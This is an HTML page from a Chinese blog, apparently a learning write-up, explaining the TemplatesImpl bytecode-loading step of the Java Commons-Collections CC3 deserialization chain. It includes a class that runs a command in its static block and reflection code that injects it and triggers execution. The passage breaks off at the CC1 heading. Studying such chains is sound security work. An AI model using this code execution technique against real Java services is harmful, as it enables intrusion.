@@ -1,0 +1,1622 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="java反序列化链子之cc3链">
+<title>java反序列化之Commons-Collections-CC3链</title>
+
+<link rel='canonical' href='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/'>
+
+<link rel="stylesheet" href="/scss/style.min.4574748025b73b0369492ab661900878369bf003d477e5f5c673ee527faf3df7.css"><meta property='og:title' content="java反序列化之Commons-Collections-CC3链">
+<meta property='og:description' content="java反序列化链子之cc3链">
+<meta property='og:url' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/'>
+<meta property='og:site_name' content='一个俗人'>
+<meta property='og:type' content='article'><meta property='article:section' content='Java' /><meta property='article:published_time' content='2025-01-03T15:21:25&#43;08:00'/><meta property='article:modified_time' content='2025-01-03T08:30:11&#43;00:00'/><meta property='og:image' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9.jpg' />
+<meta name="twitter:title" content="java反序列化之Commons-Collections-CC3链">
+<meta name="twitter:description" content="java反序列化链子之cc3链"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu7c49ec7d0c73aa09934b289b1d767e6f_13051_300x0_resize_box_3.png" width="300"
+                            height="302" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">一个俗人</a></h1>
+            <h2 class="site-description">welcome two 一个俗人&#39;s 博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/gsygsr/gsygsr.github.io.git'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://gsygsr.github.io/en/" >English</option>
+                                
+                                    <option value="https://gsygsr.github.io/" selected>中文</option>
+                                
+                                    <option value="https://gsygsr.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#字节码加载知识">字节码加载知识</a>
+      <ol>
+        <li><a href="#templatesimpl-解析">TemplatesImpl 解析</a>
+          <ol>
+            <li><a href="#_bytecodes解决"><strong>_bytecodes解决</strong></a></li>
+            <li><a href="#_tfactory解决"><strong>_tfactory解决</strong></a></li>
+            <li><a href="#完整exp"><strong>完整exp</strong></a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#cc1-链的-templatesimpl-的实现方式">CC1 链的 TemplatesImpl 的实现方式</a>
+      <ol>
+        <li><a href="#完整exp-1">完整exp</a></li>
+      </ol>
+    </li>
+    <li><a href="#cc6-链的-templatesimpl-的实现方式">CC6 链的 TemplatesImpl 的实现方式</a>
+      <ol>
+        <li><a href="#完整exp-2">完整exp</a></li>
+      </ol>
+    </li>
+    <li><a href="#回到cc3链">回到cc3链</a>
+      <ol>
+        <li><a href="#完整exp-3">完整exp</a></li>
+      </ol>
+    </li>
+    <li><a href="#流程图">流程图</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/">
+                <img src="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9_hu85212b583738171f073e269c79fb2d2a_215178_800x0_resize_q75_box.jpg"
+                        srcset="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9_hu85212b583738171f073e269c79fb2d2a_215178_800x0_resize_q75_box.jpg 800w, /java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9_hu85212b583738171f073e269c79fb2d2a_215178_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post java反序列化之Commons-Collections-CC3链" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="background-color: #2a9d8f; color: #fff;">
+                Java反序列化
+            </a>
+        
+            <a href="/categories/java%E9%93%BE/" style="background-color: #2a9d8f; color: #fff;">
+                Java链
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/">java反序列化之Commons-Collections-CC3链</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            java反序列化链子之cc3链
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 03, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="字节码加载知识">字节码加载知识
+</h2><ul>
+<li><strong>利用 ClassLoader#defineClass 直接加载字节码</strong>的手段。</li>
+</ul>
+<p><font style="color:rgb(80, 80, 92);">在这一条小链子当中，流程图可以绘制如下。</font></p>
+<p><img src="/images%5c1730279089249-9c37b034-7d65-4fa7-9609-ff38fa44a171.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><font style="color:rgb(80, 80, 92);">这里我们可以正向看，首先是</font><font style="color:rgb(80, 80, 92);"> </font><code>loadClass()</code><font style="color:rgb(80, 80, 92);">，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行</font><font style="color:rgb(80, 80, 92);"> </font><code>findClass()</code><font style="color:rgb(80, 80, 92);">。</font></p>
+<p><font style="color:rgb(80, 80, 92);">对于</font><font style="color:rgb(80, 80, 92);"> </font><code>findClass()</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">方法</font></p>
+<ul>
+<li>根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。</li>
+<li>通常由子类去实现</li>
+</ul>
+<p><strong>JAVA</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+</span></span><span class="line"><span class="cl">    throw new ClassNotFoundException(name);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// findClass 方法的源代码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">class NetworkClassLoader extends ClassLoader {
+</span></span><span class="line"><span class="cl">        String host;
+</span></span><span class="line"><span class="cl">        int port;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         public Class findClass(String name) {
+</span></span><span class="line"><span class="cl">            byte[] b = loadClassData(name);
+</span></span><span class="line"><span class="cl">             return defineClass(name, b, 0, b.length);
+</span></span><span class="line"><span class="cl">         }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         private byte[] loadClassData(String name) {
+</span></span><span class="line"><span class="cl">             // load the class data from the connection
+</span></span><span class="line"><span class="cl">         }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">// 子类的实现方式
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>defineClass()</code> 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。</li>
+</ul>
+<p>此时的 <code>defineClass()</code> 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 <code>newInstance()</code> 的实例化。</p>
+<p><font style="color:rgb(80, 80, 92);">现在我们的 </font><code>defineClass()</code><font style="color:rgb(80, 80, 92);"> 方法的作用域为 </font><code>protected</code><font style="color:rgb(80, 80, 92);">，我们需要找到作用域为 </font><code>public</code><font style="color:rgb(80, 80, 92);"> 的类，方便我们利用。照样 find usages</font></p>
+<h3 id="templatesimpl-解析">TemplatesImpl 解析
+</h3><p><img src="/images%5c1730122600558-bb743af7-195c-4b6a-b83f-2fdf2cb7996d.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><font style="color:rgb(80, 80, 92);">这里的 </font><code>defineClass()</code><font style="color:rgb(80, 80, 92);"> 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages</font></p>
+<p><img src="/images%5c1730122769497-f7f2876b-104a-44bd-ba90-659fac01d55e.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>在同类下找到<code>defineTransletClass</code>方法中看到调用了defineClass</p>
+<p>还是private,继续找调用<code>defineTransletClass</code></p>
+<p><img src="/images%5c1730122933557-58fda9c6-0394-4fa1-a5f1-d8911367db11.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="/images%5c1730122943517-9728f938-540c-422b-8677-304c83ed5222.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="/images%5c1730122953691-692839ef-9136-4d9a-9a2c-04ca6675a56f.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>以上三个方法都调用了<code>defineTransletClass</code>,为什么选择它?</p>
+<p><font style="color:rgb(80, 80, 92);">因为其调用了 </font><code>defineTransletClasses()</code><font style="color:rgb(80, 80, 92);"> 方法，并且这里有一个 </font><code>newInstance()</code><font style="color:rgb(80, 80, 92);"> 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。</font></p>
+<p><img src="/images%5c1730123329131-d2cf0fe9-0ec8-4ba2-aa42-d95a66318bc4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>找到public修饰的<code>newTransformer</code>方法,接下就是处理限制条件了</p>
+<p><img src="/images%5c1730124203836-75cb4328-aaa7-480d-99c4-535a6e92181b.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="/images%5c1730124250473-c0997935-6c20-4e76-8fb2-70288118c55b.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h4 id="_bytecodes解决"><strong>_bytecodes解决</strong>
+</h4><p><img src="/images%5c1730125196189-322f0538-1d79-419b-8708-ff92fd8b4a12.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><code>_bytecodes</code><font style="color:rgb(80, 80, 92);"> 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 </font><code>_bytecodes</code><font style="color:rgb(80, 80, 92);"> 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。</font></p>
+<p><font style="color:rgb(80, 80, 92);">先写个恶意类并编译</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package cc3;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import java.io.IOException;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class calc {
+</span></span><span class="line"><span class="cl">    //静态代码块实例化的时候会自动运行
+</span></span><span class="line"><span class="cl">    static
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            Runtime.getRuntime().exec(&#34;calc&#34;);
+</span></span><span class="line"><span class="cl">        } catch (IOException e) {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"> byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">        //{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">        byte[][] code = {evil};
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="_tfactory解决"><strong>_tfactory解决</strong>
+</h4><p><img src="/images%5c1730125707047-9cc0796c-7bc7-401f-b578-63fe6c3b1547.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>transient保证了<font style="color:rgb(80, 80, 92);">这个变量在序列化之后无法被访问</font></p>
+<p><font style="color:rgb(80, 80, 92);">在 </font><code>readObject()</code><font style="color:rgb(80, 80, 92);"> 方法中，找到了 </font><code>_tfactory</code><font style="color:rgb(80, 80, 92);"> 的初始化定义。</font></p>
+<p><img src="/images%5c1730125854645-da282866-253f-4edd-b99a-349e5d2d5ef9.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>刚好能在反序列化的时候初始化,就能让<code>_tfactory值不为null</code></p>
+<p>通过反射修改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面的<code>_name</code>和<code>_bytecodes</code>也是通过反射来修改</p>
+<h4 id="完整exp"><strong>完整exp</strong>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TemplatesImpl templates = new TemplatesImpl();
+</span></span><span class="line"><span class="cl">Class templatesclass = templates.getClass();
+</span></span><span class="line"><span class="cl">Field name = templatesclass.getDeclaredField(&#34;_name&#34;);
+</span></span><span class="line"><span class="cl">name.setAccessible(true);
+</span></span><span class="line"><span class="cl">name.set(templates,&#34;Y9sR&#34;);
+</span></span><span class="line"><span class="cl">Field codes  = templatesclass.getDeclaredField(&#34;_bytecodes&#34;);
+</span></span><span class="line"><span class="cl">codes.setAccessible(true);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">byte[] evil = Files.readAllBytes(Paths.get(&#34;E:\\javawork\\cc3\\src\\main\\java\\cc3\\calc.class&#34;));
+</span></span><span class="line"><span class="cl">//{}包含一个数组的数组
+</span></span><span class="line"><span class="cl">byte[][] code = {evil};
+</span></span><span class="line"><span class="cl">codes.set(templates,code);
+</span></span><span class="line"><span class="cl">Field field = templatesclass.getDeclaredField(&#34;_tfactory&#34;);
+</span></span><span class="line"><span class="cl">field.setAccessible(true);
+</span></span><span class="line"><span class="cl">field.set(templates,new TransformerFactoryImpl());
+</span></span><span class="line"><span class="cl">templates.newTransformer();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行完但是不弹计算器且报错</p>
+<p><img src="/images%5c1730203540011-aec37d44-08a7-45f5-b608-3df028e5ede7.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>空指针报错</p>
+<p>看报错是在<code>422行</code>空指针报错,打了断点</p>
+<p><img src="/images%5c1730204346663-8b2a0aca-f080-4c1e-aad6-0da80794c1aa.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>死在了else这里</p>
+<p><img src="/images%5c1730204404589-0e2d6cb5-1c5a-47a7-b530-33269795924c.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>这里要么<code>_auxClasses</code>赋值,要么if判断正确不进入else</p>
+<p>如果给<code>_auxClasses</code>赋值,在下面的if判断时,&lt;0会抛出异常</p>
+<p>所以这里让上面的if判断正确好点</p>
+<p>分析for这里的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">_class[i] = loader.defineClass(_bytecodes[i]);
+</span></span><span class="line"><span class="cl">//_class这里会得到_bytecodes的字节码加载的类
+</span></span><span class="line"><span class="cl">final Class superClass = _class[i].getSuperclass();
+</span></span><span class="line"><span class="cl">//这里是得到_bytescodes类的父类
+</span></span><span class="line"><span class="cl">// Check if this is the main class
+</span></span><span class="line"><span class="cl">if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+</span></span><span class="line"><span class="cl">//判断字节码的类是否继承了ABSTRACT_TRANSLET
+</span></span><span class="line"><span class="cl">    _transletIndex = i;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以只需要给我们的恶意类加上继承<code>AbstractTranslet</code></p>
+<p><img src="/images%5c1730205042673-5f7b2aed-4c14-4b79-a2b7-1b6daae1fb69.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>重新编译一下calc.java运行后弹计算器</p>
+<h2 id="cc1-链的-templatesimpl-的实现方式">CC1 链的 TemplatesImpl 的实现方式
